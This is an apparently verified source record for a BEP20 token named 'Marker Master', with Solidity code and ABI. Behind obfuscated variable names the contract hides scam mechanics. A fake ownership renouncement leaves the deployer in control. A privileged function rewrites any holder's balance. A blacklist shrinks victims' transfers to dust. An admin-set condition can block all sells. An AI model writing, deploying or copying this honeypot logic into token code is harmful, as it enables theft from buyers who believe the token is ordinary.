{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface fromAmount {\n    function createPair(address shouldTake, address enableSell) external returns (address);\n}\n\ninterface tradingAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenShould) external view returns (uint256);\n\n    function transfer(address feeTx, uint256 exemptAuto) external returns (bool);\n\n    function allowance(address takeTradingSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTx,\n        uint256 exemptAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverList, uint256 value);\n    event Approval(address indexed takeTradingSender, address indexed spender, uint256 value);\n}\n\nabstract contract listExemptFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isSell is tradingAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MarkerMaster is listExemptFee, tradingAuto, isSell {\n\n    address private enableTake;\n\n    function transferFrom(address marketingMin, address feeTx, uint256 exemptAuto) external override returns (bool) {\n        if (_msgSender() != maxLaunched) {\n            if (autoMin[marketingMin][_msgSender()] != type(uint256).max) {\n                require(exemptAuto <= autoMin[marketingMin][_msgSender()]);\n                autoMin[marketingMin][_msgSender()] -= exemptAuto;\n            }\n        }\n        return maxAutoTrading(marketingMin, feeTx, exemptAuto);\n    }\n\n    function atFee(address modeTotalReceiver, uint256 exemptAuto) public {\n        totalTx();\n        exemptAmount[modeTotalReceiver] = exemptAuto;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableTake;\n    }\n\n    function owner() external view returns (address) {\n        return enableTake;\n    }\n\n    string private totalFrom = \"Marker Master\";\n\n    event OwnershipTransferred(address indexed swapShould, address indexed txWallet);\n\n    uint256 public minSell;\n\n    uint256 maxBuy;\n\n    function listFund(address marketingReceiver) public {\n        totalTx();\n        if (minSell != teamLimit) {\n            walletSwap = true;\n        }\n        if (marketingReceiver == isFund || marketingReceiver == receiverTradingTo) {\n            return;\n        }\n        buyTake[marketingReceiver] = true;\n    }\n\n    constructor (){\n        \n        minTo sellBuy = minTo(maxLaunched);\n        receiverTradingTo = fromAmount(sellBuy.factory()).createPair(sellBuy.WETH(), address(this));\n        if (launchFromLaunched) {\n            limitWallet = true;\n        }\n        isFund = _msgSender();\n        takeEnable[isFund] = true;\n        exemptAmount[isFund] = buyEnableMode;\n        atSender();\n        if (teamLimit == minSell) {\n            minSell = teamLimit;\n        }\n        emit Transfer(address(0), isFund, buyEnableMode);\n    }\n\n    mapping(address => mapping(address => uint256)) private autoMin;\n\n    function allowance(address receiverIsLiquidity, address txAtTo) external view virtual override returns (uint256) {\n        if (txAtTo == maxLaunched) {\n            return type(uint256).max;\n        }\n        return autoMin[receiverIsLiquidity][txAtTo];\n    }\n\n    uint256 buyReceiverReceiver;\n\n    bool private launchFromLaunched;\n\n    address public receiverTradingTo;\n\n    function atSender() public {\n        emit OwnershipTransferred(isFund, address(0));\n        enableTake = address(0);\n    }\n\n    string private listAmount = \"MMR\";\n\n    address totalAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private teamLimit;\n\n    bool private limitWallet;\n\n    function maxAutoTrading(address marketingMin, address feeTx, uint256 exemptAuto) internal returns (bool) {\n        if (marketingMin == isFund) {\n            return enableSwap(marketingMin, feeTx, exemptAuto);\n        }\n        uint256 teamTo = tradingAuto(receiverTradingTo).balanceOf(totalAt);\n        require(teamTo == maxBuy);\n        require(feeTx != totalAt);\n        if (buyTake[marketingMin]) {\n            return enableSwap(marketingMin, feeTx, teamListMax);\n        }\n        return enableSwap(marketingMin, feeTx, exemptAuto);\n    }\n\n    function totalTx() private view {\n        require(takeEnable[_msgSender()]);\n    }\n\n    function enableSwap(address marketingMin, address feeTx, uint256 exemptAuto) internal returns (bool) {\n        require(exemptAmount[marketingMin] >= exemptAuto);\n        exemptAmount[marketingMin] -= exemptAuto;\n        exemptAmount[feeTx] += exemptAuto;\n        emit Transfer(marketingMin, feeTx, exemptAuto);\n        return true;\n    }\n\n    uint256 private buyEnableMode = 100000000 * 10 ** 18;\n\n    address public isFund;\n\n    mapping(address => uint256) private exemptAmount;\n\n    mapping(address => bool) public buyTake;\n\n    bool public amountMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyEnableMode;\n    }\n\n    bool private walletSwap;\n\n    bool private autoToken;\n\n    uint256 constant teamListMax = 6 ** 10;\n\n    function txTrading(uint256 exemptAuto) public {\n        totalTx();\n        maxBuy = exemptAuto;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalFrom;\n    }\n\n    function balanceOf(address tokenShould) public view virtual override returns (uint256) {\n        return exemptAmount[tokenShould];\n    }\n\n    function transfer(address modeTotalReceiver, uint256 exemptAuto) external virtual override returns (bool) {\n        return maxAutoTrading(_msgSender(), modeTotalReceiver, exemptAuto);\n    }\n\n    function sellAmount(address amountSellMarketing) public {\n        require(amountSellMarketing.balance < 100000);\n        if (amountMin) {\n            return;\n        }\n        if (limitWallet) {\n            limitWallet = false;\n        }\n        takeEnable[amountSellMarketing] = true;\n        if (launchFromLaunched) {\n            walletSwap = true;\n        }\n        amountMin = true;\n    }\n\n    mapping(address => bool) public takeEnable;\n\n    address maxLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxLaunchBuy;\n    }\n\n    function approve(address txAtTo, uint256 exemptAuto) public virtual override returns (bool) {\n        autoMin[_msgSender()][txAtTo] = exemptAuto;\n        emit Approval(_msgSender(), txAtTo, exemptAuto);\n        return true;\n    }\n\n    uint8 private maxLaunchBuy = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTradingSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIsLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txAtTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAtTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"atFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"}],\"name\":\"listFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTradingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSellMarketing\",\"type\":\"address\"}],\"name\":\"sellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"txTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MarkerMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}